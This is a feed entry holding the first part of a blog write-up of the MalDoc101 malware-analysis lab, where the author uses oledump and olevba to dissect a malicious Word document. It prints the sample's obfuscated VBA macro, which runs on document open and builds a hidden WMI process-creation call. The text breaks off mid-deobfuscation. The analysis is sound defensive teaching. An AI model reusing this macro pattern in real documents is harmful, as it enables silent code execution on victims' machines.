<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>AccidentalRebel.com - malware_analysis</title><link href="https://www.accidentalrebel.com/" rel="alternate"></link><link href="https://www.accidentalrebel.com/feeds/malware_analysis.atom.xml" rel="self"></link><id>https://www.accidentalrebel.com/</id><updated>2021-03-13T08:34:00+08:00</updated><entry><title>Maldoc101 Writeup (Part 1)</title><link href="https://www.accidentalrebel.com/maldoc101-writeup-part-1.html" rel="alternate"></link><published>2021-03-13T08:34:00+08:00</published><updated>2021-03-13T08:34:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-03-13:/maldoc101-writeup-part-1.html</id><summary type="html">&lt;p&gt;This is part 1 out of 2 of my writeup for the Maldoc101 challenge made by Josh Stroschein (&lt;a href="https://twitter.com/jstrosch"&gt;@jstrosch&lt;/a&gt;) and is currently playable at &lt;a href="https://cyberdefenders.org/labs/51"&gt;Cyberdefenders.Org&lt;/a&gt;. I've done some maldoc analysis before but this is the first time I'm writing about my approach.&lt;/p&gt;
&lt;p&gt;There is also an already existing writeup about this challenge &lt;a href="https://github.com/jstrosch/malware-samples/blob/master/malware_analysis_exercises/2020/December/solution.md"&gt;from the creator himself&lt;/a&gt;. You should check that out if you want a more detailed and focused writeup. This writeup is more from the perspective of someone relatively new to malware analysis. There's a lot more exploration and trial-and-error which, I hope, might give the reader a different view in how this kind of problem is approached.&lt;/p&gt;
&lt;h2 id="the-challenge"&gt;The challenge&lt;/h2&gt;
&lt;h3 id="name"&gt;Name&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://cyberdefenders.org/labs/51"&gt;MalDoc101 - Malicious Document&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="description"&gt;Description&lt;/h3&gt;
&lt;p&gt;It is common for threat actors to utilize living off the land (LOTL) techniques, such as the execution of PowerShell to further their attacks and transition from macro code. This challenge is intended â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is part 1 out of 2 of my writeup for the Maldoc101 challenge made by Josh Stroschein (&lt;a href="https://twitter.com/jstrosch"&gt;@jstrosch&lt;/a&gt;) and is currently playable at &lt;a href="https://cyberdefenders.org/labs/51"&gt;Cyberdefenders.Org&lt;/a&gt;. I've done some maldoc analysis before but this is the first time I'm writing about my approach.&lt;/p&gt;
&lt;p&gt;There is also an already existing writeup about this challenge &lt;a href="https://github.com/jstrosch/malware-samples/blob/master/malware_analysis_exercises/2020/December/solution.md"&gt;from the creator himself&lt;/a&gt;. You should check that out if you want a more detailed and focused writeup. This writeup is more from the perspective of someone relatively new to malware analysis. There's a lot more exploration and trial-and-error which, I hope, might give the reader a different view in how this kind of problem is approached.&lt;/p&gt;
&lt;h2 id="the-challenge"&gt;The challenge&lt;/h2&gt;
&lt;h3 id="name"&gt;Name&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://cyberdefenders.org/labs/51"&gt;MalDoc101 - Malicious Document&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="description"&gt;Description&lt;/h3&gt;
&lt;p&gt;It is common for threat actors to utilize living off the land (LOTL) techniques, such as the execution of PowerShell to further their attacks and transition from macro code. This challenge is intended to show how you can often times perform quick analysis to extract important IOCs. The focus of this exercise is on static techniques for analysis.&lt;/p&gt;
&lt;h3 id="suggested-tools"&gt;Suggested Tools&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;REMnux Virtual Machine (remnux.org)&lt;/li&gt;
&lt;li&gt;Terminal/Command prompt w/ Python installed&lt;/li&gt;
&lt;li&gt;Oledump&lt;/li&gt;
&lt;li&gt;Text editor&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="the-easy-questions"&gt;The easy questions&lt;/h2&gt;
&lt;p&gt;The first question seems very easy. The &lt;em&gt;suggested tools&lt;/em&gt; section above also gives us an idea how to approach this.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;What streams contain macros in this document? (comma-separated, ascending).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="https://blog.didierstevens.com/programs/oledump-py/"&gt;oledump.py&lt;/a&gt; is a tool made by &lt;a href="https://blog.didierstevens.com/about/"&gt;Didier Stevens&lt;/a&gt; that allows the analysis of data streams found in OLE files such as MS Office documetns. Running the command below would show us which streams have macros in it. These are denoted with the character &lt;em&gt;M&lt;/em&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;oledump.py&lt;span class="w"&gt; &lt;/span&gt;sample.bin
&lt;span class="go"&gt;  1:       114 &amp;#39;\x01CompObj&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;  2:      4096 &amp;#39;\x05DocumentSummaryInformation&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;  3:      4096 &amp;#39;\x05SummaryInformation&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;  4:      7119 &amp;#39;1Table&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;  5:    101483 &amp;#39;Data&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;  6:       581 &amp;#39;Macros/PROJECT&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;  7:       119 &amp;#39;Macros/PROJECTwm&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;  8:     12997 &amp;#39;Macros/VBA/_VBA_PROJECT&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;  9:      2112 &amp;#39;Macros/VBA/__SRP_0&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt; 10:       190 &amp;#39;Macros/VBA/__SRP_1&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt; 11:       532 &amp;#39;Macros/VBA/__SRP_2&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt; 12:       156 &amp;#39;Macros/VBA/__SRP_3&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt; 13: M    1367 &amp;#39;Macros/VBA/diakzouxchouz&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt; 14:       908 &amp;#39;Macros/VBA/dir&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt; 15: M    5705 &amp;#39;Macros/VBA/govwiahtoozfaid&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt; 16: m    1187 &amp;#39;Macros/VBA/roubhaol&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt; 17:        97 &amp;#39;Macros/roubhaol/\x01CompObj&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt; ...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I later noticed that there is an upper-case and lower-case &lt;em&gt;M&lt;/em&gt;. I learned that the upper-case &lt;em&gt;M&lt;/em&gt; denotes a macro with a code. The lower-case denotes a user form. This is a distinction that will be important later in this challenge.&lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;What command-line argument with Oledump do you use to view the raw content of a stream? (Do not include the leading dash) &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The next question is another easy one which ran easily be solved through &lt;code&gt;oledump.py&lt;/code&gt;'s &lt;em&gt;--help&lt;/em&gt; parameter.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;oledump.py&lt;span class="w"&gt; &lt;/span&gt;--help
&lt;span class="go"&gt;Usage: oledump.py [options] [file]&lt;/span&gt;
&lt;span class="go"&gt;Analyze OLE files (Compound Binary Files)&lt;/span&gt;

&lt;span class="go"&gt;Options:&lt;/span&gt;
&lt;span class="go"&gt;  --version             show program&amp;#39;s version number and exit&lt;/span&gt;
&lt;span class="go"&gt;  -h, --help            show this help message and exit&lt;/span&gt;
&lt;span class="go"&gt;  -m, --man             Print manual&lt;/span&gt;
&lt;span class="go"&gt;  -s SELECT, --select=SELECT&lt;/span&gt;
&lt;span class="go"&gt;                        select item nr for dumping (a for all)&lt;/span&gt;
&lt;span class="go"&gt;  -d, --dump            perform dump&lt;/span&gt;
&lt;span class="go"&gt;  -x, --hexdump         perform hex dump&lt;/span&gt;
&lt;span class="go"&gt;  -a, --asciidump       perform ascii dump&lt;/span&gt;
&lt;span class="go"&gt;  -A, --asciidumprle    perform ascii dump with RLE&lt;/span&gt;
&lt;span class="go"&gt;  -S, --strings         perform strings dump&lt;/span&gt;
&lt;span class="go"&gt;  -T, --headtail        do head &amp;amp; tail&lt;/span&gt;
&lt;span class="go"&gt;  -v, --vbadecompress   VBA decompression&lt;/span&gt;
&lt;span class="go"&gt;  ...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The answer to question number two is easy to spot.&lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;What event is used to begin the execution of the macros?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I used a different tool for this particular question mostly because I knew that it already shows the information I need to answer the question. The tool is called &lt;code&gt;olevba&lt;/code&gt; which is part of the &lt;a href="https://github.com/decalage2/oletools"&gt;oletools&lt;/a&gt; package of Python tools. &lt;em&gt;Olevba&lt;/em&gt; is used for extracting and analyzing VBA macro source code for MS Office documents.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;olevba&lt;span class="w"&gt; &lt;/span&gt;sample.bin
&lt;span class="go"&gt;+----------+--------------------+---------------------------------------------+&lt;/span&gt;
&lt;span class="go"&gt;|Type      |Keyword             |Description                                  |&lt;/span&gt;
&lt;span class="go"&gt;+----------+--------------------+---------------------------------------------+&lt;/span&gt;
&lt;span class="go"&gt;|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |&lt;/span&gt;
&lt;span class="go"&gt;|          |                    |opened                                       |&lt;/span&gt;
&lt;span class="go"&gt;|Suspicious|Create              |May execute file or a system command through |&lt;/span&gt;
&lt;span class="go"&gt;|          |                    |WMI                                          |&lt;/span&gt;
&lt;span class="go"&gt;|Suspicious|showwindow          |May hide the application                     |&lt;/span&gt;
&lt;span class="go"&gt;|Suspicious|CreateObject        |May create an OLE object                     |&lt;/span&gt;
&lt;span class="go"&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="onto-the-main-event"&gt;Onto the main event&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;What malware family was this maldoc attempting to drop?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I figured that the way for me to determine the answer for the question above is to start investigating the macro codes included in the document.&lt;/p&gt;
&lt;p&gt;I knew from the previous question that the entry point to begin the execution of the macros is with the function &lt;code&gt;Document_open()&lt;/code&gt;. The next step is to look for this entry point and go through the code to understand what the macro is doing.&lt;/p&gt;
&lt;p&gt;To view the contents of a stream, I used the command below:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;oledump.py&lt;span class="w"&gt; &lt;/span&gt;sample.bin&lt;span class="w"&gt; &lt;/span&gt;-s&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-v
&lt;span class="go"&gt;Attribute VB_Name = &amp;quot;diakzouxchouz&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Attribute VB_Base = &amp;quot;1Normal.ThisDocument&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Attribute VB_GlobalNameSpace = False&lt;/span&gt;
&lt;span class="go"&gt;Attribute VB_Creatable = False&lt;/span&gt;
&lt;span class="go"&gt;Attribute VB_PredeclaredId = True&lt;/span&gt;
&lt;span class="go"&gt;Attribute VB_Exposed = True&lt;/span&gt;
&lt;span class="go"&gt;Attribute VB_TemplateDerived = True&lt;/span&gt;
&lt;span class="go"&gt;Attribute VB_Customizable = True&lt;/span&gt;
&lt;span class="go"&gt;Private Sub _&lt;/span&gt;
&lt;span class="go"&gt;Document_open()&lt;/span&gt;
&lt;span class="go"&gt;boaxvoebxiotqueb&lt;/span&gt;
&lt;span class="go"&gt;End Sub&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In the above output, I saw that &lt;code&gt;Document_open()&lt;/code&gt; contains a single line of code which is a call to function &lt;code&gt;boaxvoebxiotqueb'&lt;/code&gt;. This function is included in stream &lt;code&gt;15&lt;/code&gt; which can be viewed with the command:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;oledump.py&lt;span class="w"&gt; &lt;/span&gt;sample.bin&lt;span class="w"&gt; &lt;/span&gt;-s&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-v
Attribute&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;VB_Name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;govwiahtoozfaid&amp;quot;&lt;/span&gt;
Function&lt;span class="w"&gt; &lt;/span&gt;boaxvoebxiotqueb&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="nv"&gt;gooykadheoj&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;Chr&lt;span class="o"&gt;(&lt;/span&gt;roubhaol.Zoom&lt;span class="w"&gt; &lt;/span&gt;+&lt;span class="w"&gt; &lt;/span&gt;Int&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;*&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
Dim&lt;span class="w"&gt; &lt;/span&gt;c7ï¿½ATOQe2ï¿½j&lt;span class="w"&gt; &lt;/span&gt;As&lt;span class="w"&gt; &lt;/span&gt;Integer
c7ï¿½ATOQe2ï¿½j&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;
Do&lt;span class="w"&gt; &lt;/span&gt;While&lt;span class="w"&gt; &lt;/span&gt;c7ï¿½ATOQe2ï¿½j&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;+&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;
c7ï¿½ATOQe2ï¿½j&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;c7ï¿½ATOQe2ï¿½j&lt;span class="w"&gt; &lt;/span&gt;+&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;DoEvents
Loop
&lt;span class="nv"&gt;haothkoebtheil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqw2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqin2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqm2342772g3&amp;amp;*gs7712ffvs626fqgm2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqt2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;+&lt;span class="w"&gt; &lt;/span&gt;gooykadheoj&lt;span class="w"&gt; &lt;/span&gt;+&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fq:w2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqin2342772g3&amp;amp;*gs7712ffvs626fq322342772g3&amp;amp;*gs7712ffvs626fq_2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;+&lt;span class="w"&gt; &lt;/span&gt;roubhaol.joefwoefcheaw&lt;span class="w"&gt; &lt;/span&gt;+&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2342772g3&amp;amp;*gs7712ffvs626fqr2342772g3&amp;amp;*gs7712ffvs626fqo2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqc2342772g3&amp;amp;*gs7712ffvs626fqes2342772g3&amp;amp;*gs7712ffvs626fqs2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot;&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The above output contains more lines of what looks like gibberish code. Upon further inspection I realized that it's actually obfuscated. I can see common coding patterns which tells me that I could make sense of the code if I step through it and organize it so it is easy to understand.&lt;/p&gt;
&lt;p&gt;The first line of the &lt;code&gt;boaxvoebxiotqueb&lt;/code&gt; shows:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gooykadheoj = Chr(roubhaol.Zoom + Int(5 * 3))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;What's &lt;code&gt;roubhaol&lt;/code&gt;? Since this is the first line in the function, I know that it is not a locally defined variable. It must be declared somplace else.&lt;/p&gt;
&lt;p&gt;After looking around I learned that &lt;code&gt;roubhaol&lt;/code&gt; is a the name of the user form at stream &lt;em&gt;16&lt;/em&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;16: m    1187 &amp;#39;Macros/VBA/roubhaol&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So the next step is figuring out what &lt;code&gt;roubhaol.Zoom&lt;/code&gt;'s value is. This value is not set anywhere in any of the macros by code. This means that the value is set in the form itself. To confirm, I opened up the Word document, pressed &lt;code&gt;Alt+F11&lt;/code&gt; to open up the Visual Basic editor and then opened the &lt;code&gt;roubhaol&lt;/code&gt; form. At the bottom we see that the value of &lt;code&gt;Zoom&lt;/code&gt; is set to &lt;code&gt;100&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="maldoc101-writeup-01" src="https://www.accidentalrebel.com/images/maldoc101-writeup-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;This means that by simulating the first line of code again we find that the variable &lt;code&gt;gooykadheoj&lt;/code&gt; gets the character value of &lt;code&gt;s&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gooykadheoj = Chr(roubhaol.Zoom + Int(5 &lt;span class="gs"&gt;* 3))&lt;/span&gt;
&lt;span class="gs"&gt;gooykadheoj = Chr(100 + Int(5 *&lt;/span&gt; 3))
gooykadheoj = Chr(115)
gooykadheoj = Chr(115) # character &amp;quot;s&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I then proceeded to go through the next set of lines.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;c7&lt;/span&gt;ï¿½&lt;span class="nv"&gt;ATOQe2&lt;/span&gt;ï¿½&lt;span class="nv"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Integer&lt;/span&gt;
&lt;span class="nv"&gt;c7&lt;/span&gt;ï¿½&lt;span class="nv"&gt;ATOQe2&lt;/span&gt;ï¿½&lt;span class="nv"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;
&lt;span class="k"&gt;Do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;While&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;c7&lt;/span&gt;ï¿½&lt;span class="nv"&gt;ATOQe2&lt;/span&gt;ï¿½&lt;span class="nv"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="nv"&gt;c7&lt;/span&gt;ï¿½&lt;span class="nv"&gt;ATOQe2&lt;/span&gt;ï¿½&lt;span class="nv"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;c7&lt;/span&gt;ï¿½&lt;span class="nv"&gt;ATOQe2&lt;/span&gt;ï¿½&lt;span class="nv"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;DoEvents&lt;/span&gt;
&lt;span class="k"&gt;Loop&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This one is easier to simulate. &lt;code&gt;c7ï¿½ATOQe2ï¿½j&lt;/code&gt; is assigend 6. And then there's a loop that adds &lt;code&gt;5&lt;/code&gt; that eventually results to the value of &lt;code&gt;16&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;But wait, something is fishy here. The variable &lt;code&gt;c7ï¿½ATOQe2ï¿½j&lt;/code&gt; is not found anywhere else after the block of code above. This tells us that this is just junk code that does not really do anything aside from waste an analyst's time! Sneaky sneaky.&lt;/p&gt;
&lt;p&gt;To save me the time I proceeded to remove all junk code. I did this by going through each variables and seeing if they are used somewhere useful. If not, then they are safe to remove.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Attribute VB_Name = &amp;quot;govwiahtoozfaid&amp;quot;
Function boaxvoebxiotqueb()
    gooykadheoj = Chr(roubhaol.Zoom + Int(5 * 3))

    haothkoebtheil = &amp;quot;2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqw2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqin2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqm2342772g3&amp;amp;*gs7712ffvs626fqgm2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqt2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot; + gooykadheoj + &amp;quot;2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fq:w2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqin2342772g3&amp;amp;*gs7712ffvs626fq322342772g3&amp;amp;*gs7712ffvs626fq_2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot; + roubhaol.joefwoefcheaw + &amp;quot;2342772g3&amp;amp;*gs7712ffvs626fqr2342772g3&amp;amp;*gs7712ffvs626fqo2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqc2342772g3&amp;amp;*gs7712ffvs626fqes2342772g3&amp;amp;*gs7712ffvs626fqs2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot;

    deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)

    Set tiajriokchaoy = CreateObject(deulsaocthuul)

    deaknaugthein = roubhaol.kaizseah.ControlTipText
    giakfeiw = deulsaocthuul + gooykadheoj + roubhaol.paerwagyouqumeid.ControlTipText + deaknaugthein
    queegthaen = giakfeiw + roubhaol.joefwoefcheaw

    Set deavjoajsear = luumlaud(queegthaen)

    xve = Array &lt;span class="ge"&gt;_&lt;/span&gt;
&lt;span class="ge"&gt;        (&amp;quot;1234444123&amp;quot;, tiajriokchaoy. _&lt;/span&gt;
        Create(geulgelquuuj, kaenhaig, deavjoajsear), &amp;quot;9938723&amp;quot;)
End Function

Function juuvzouchmiopxeox(yiajthoavheiw)
    geutyoeytiestheug = yiajthoavheiw
    feaxgeip = Split(geutyoeytiestheug, &amp;quot;2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot;)

    jaquhoiqu = csqw + Join(feaxgeip, eihnx)
    juuvzouchmiopxeox = jaquhoiqu
End Function

Function geulgelquuuj()
    sjiqw = roubhaol.gaoddaicsauktheb.Pages(10 / 10).ControlTipText
    geulgelquuuj = juuvzouchmiopxeox(sjiqw)
End Function

Function luumlaud(zeolkaepxoag)
    Set luumlaud = CreateObject(zeolkaepxoag)
    Dim vPu As String
    vPu = Replace$(&amp;quot;BenqV1ï¿½igVwifwdQq&amp;quot;, &amp;quot;BenqV1ï¿½i&amp;quot;, &amp;quot;on5ï¿½&amp;quot;)
        luumlaud &lt;span class="ge"&gt;_&lt;/span&gt;
&lt;span class="ge"&gt;        . _&lt;/span&gt;
        showwindow = (mujgoiy + jioyseertioch) + (neivberziok + xuajroegquoudcaij)
End Function
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As you can see above, the code is shorter. It's also a little easier to understand. Only a little though, we still need to step through the code carefully to have a better grasp of what it is doing.&lt;/p&gt;
&lt;p&gt;Let's take on the next line:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;haothkoebtheil = &amp;quot;2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqw2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqin2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqm2342772g3&amp;amp;*gs7712ffvs626fqgm2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqt2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot; + gooykadheoj + &amp;quot;2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fq:w2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqin2342772g3&amp;amp;*gs7712ffvs626fq322342772g3&amp;amp;*gs7712ffvs626fq_2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot; + roubhaol.joefwoefcheaw + &amp;quot;2342772g3&amp;amp;*gs7712ffvs626fqr2342772g3&amp;amp;*gs7712ffvs626fqo2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqc2342772g3&amp;amp;*gs7712ffvs626fqes2342772g3&amp;amp;*gs7712ffvs626fqs2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If we look at the string carefully we would notice that a set of strings is concatenated with two variables. These variables are &lt;code&gt;gooykadheoj&lt;/code&gt; and &lt;code&gt;roubhaol.joefwoefcheaw&lt;/code&gt;. We already know the value of &lt;code&gt;gooykadheoj&lt;/code&gt;. So what's the value of &lt;code&gt;roubhaol.joefwoefcheaw&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;I got this value by going back to Visual Basic Editor and selelecting &lt;code&gt;joefwoefcheaw&lt;/code&gt;. The value we need is listed under &lt;code&gt;Text&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="maldoc101-writeup-02" src="https://www.accidentalrebel.com/images/maldoc101-writeup-02.png" /&gt;&lt;/p&gt;
&lt;p&gt;Substituting the values &lt;code&gt;s&lt;/code&gt; and &lt;code&gt;P&lt;/code&gt; I got the following:&lt;/p&gt;
